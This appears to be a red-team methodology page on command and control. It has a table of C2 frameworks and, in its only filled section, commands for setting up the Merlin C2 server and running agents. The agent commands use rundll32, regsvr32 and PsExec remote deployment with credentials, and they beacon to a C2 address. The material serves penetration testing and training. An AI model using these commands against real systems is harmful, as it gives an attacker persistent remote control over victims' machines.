# Command and Control
[**Back** to Methodologies](/Methodology#methodologies)

*Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victimâ€™s network structure and defenses.*
                                                -[Mitre ATT&CK](https://attack.mitre.org/tactics/TA0011/)

+ [Setting up External Servers](#setting-up-external-servers)
  + [Digital Ocean](#digital-ocean)
  + [AWS Lightsail](#aws-lightsail)
  + [Linode](#linode)
+ [C2 Frameworks](#c2-frameworks)
  + [Metasploit](#metasploit)
  + [Cobalt Strike](#cobalt-strike)
  + [PowerShell Empire](#powershell-empire)
  + [dnscat2](#dnscat2)
  + [Pupy Shell](#pupy-shell)
  + [PoshC2](#poshc2)
  + [Merlin](#merlin)
  + [Nishang](#nishang)

# Setting up External Servers



## Digital Ocean

## AWS Lightsail

## Linode

# C2 Frameworks

| Name | Written in | Clame to fame |
| :-: | :-: | --- |
| [Metasploit](#metasploit) | Ruby | Gold Standard, active community support |
| [Cobalt Strike](#cobalt-strike) | Aggressor | Post-exploitation, also Gold Standard (NOT FREE!) |
| [Powershell Empire](#powershell-empire) | PowerShell(Win)/Python(Linux) | Post-exploitation great for Window/AD envs |
| [dnscat2](#dnscat2) | C | Encrypted tunnels over DNS (usually a way "out" of almost every network) |
| [Pupy Shell](#pupy-shell) | Python | Run python on all agents without it actually being on your host |
| [PoshC2](#poshc2) | PowerShell | Proxy aware C2 framework |
| [Merlin](#merlin) | GO | HTTP/2 multiplexed, bi-directional connections that stay open and are in binary. Easy to parse and not human readable without an interpreter |
| [Nishang](#nishang) | PowerShell | Amazing collection of PowerShell scripts that can be used for C2 and all other phases |

# Metasploit

# Cobalt Strike

# Powershell Empire

# dnscat2

# Pupy Shell

# PoshC2

# Merlin

![image](https://user-images.githubusercontent.com/83407557/173481864-e97d726a-d779-4926-8f0f-08244bded3de.png)

[Online Documentation](https://merlin-c2.readthedocs.io/en/latest/index.html)

[Github page](https://github.com/Ne0nd0g/merlin)

## Merlin Server

The following single line of code can be used to download, extract, and run Merlin Server on an Ubuntu Server:
```bash
sudo bash;apt update;apt install p7zip-full -y;cd /opt;wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z;7z x -pmerlin -omerlin merlinServer-Linux-x64.7z;cd merlin;./merlinServer-Linux-x64
```
## Merlin Agents

Pre-compiled Merlin Agent binary files are distributed with the server download in the data/bin/ directory of Merlin

Can also use GO to retrieve and build an Agent
```bash
go get github.com/Ne0nd0g/merlin-agent
```

### Upload and Execute

Unless recompiling binary, the hardcoded -url flag needs to be set to your C2 server url when executing. For these examples the C2 server ip is 192.168.1.100.



### Windows Local Execution

#### CMD.exe
```cmd
C:\Users\Bob\Downloads>merlinAgent.exe -url https://192.168.1.100:443/
```
#### rundll32.exe
```cmd
C:\Users\Bob\Downloads>C:\WINDOWS\System32\rundll32.exe merlin.dll,Run https://192.168.1.100:443/
```

### Windows Remote Execution

#### PsExec.exe
```cmd
PS C:\SysinternalsSuite>.\PsExec.exe \\192.168.1.10 -u bob -p password -d -c C:\merlin\data\bin\windows\merlinAgent.exe -url https://192.168.1.100:443/
```

### Recompiling DLL
The merlin.dll file can be configured with the hardcoded url of your Merlin server. To do this, clone the repo, modify the file, and recompile it.
```bash
cd /opt
git clone -b dev https://github.com/Ne0nd0g/merlin-agent-dll.git
cd merlin-agent-dll
sed -i 's_https://127.0.0.1:443/_https://192.168.1.100:443/_' main.go
make
```
Running dll with rundll32.exe
```cmd
rundll32.exe merlin,main
rundll32.exe merlin,Run
```
with regsvr32.exe
```cmd
regsvr32.exe /s merlin.dll
regsvr32.exe /s /u merlin.dll
regsvr32.exe /s /n /i merlin.dll
```


# Nishang

